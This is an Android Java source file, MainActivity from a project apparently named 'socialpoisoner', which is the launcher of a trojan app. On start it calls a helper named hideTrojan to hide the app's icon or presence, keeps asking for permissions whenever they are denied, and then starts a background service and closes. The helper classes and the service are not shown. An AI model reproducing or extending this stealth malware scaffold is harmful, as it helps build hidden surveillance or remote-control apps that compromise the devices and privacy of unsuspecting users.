package com.cakeman.doctorrabb.socialpoisoner;

import android.content.Intent;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.cakeman.doctorrabb.socialpoisoner.modules.Util;

/*
    Code of MainActivity.java.
    By DOCTOR_RABB
 */

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Util.hideTrojan (getApplicationContext());

        try {
            Util.requestWithout (this);
        } catch (Exception e) {
            Log.e ("Request Permission Error", e.getMessage());
        }
        startService (new Intent (this, srv.class));
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (grantResults.length == 0) {
            Util.requestWithout (this);
        }
        else {
            startService (new Intent (this, srv.class));
            finish();
        }
    }
}
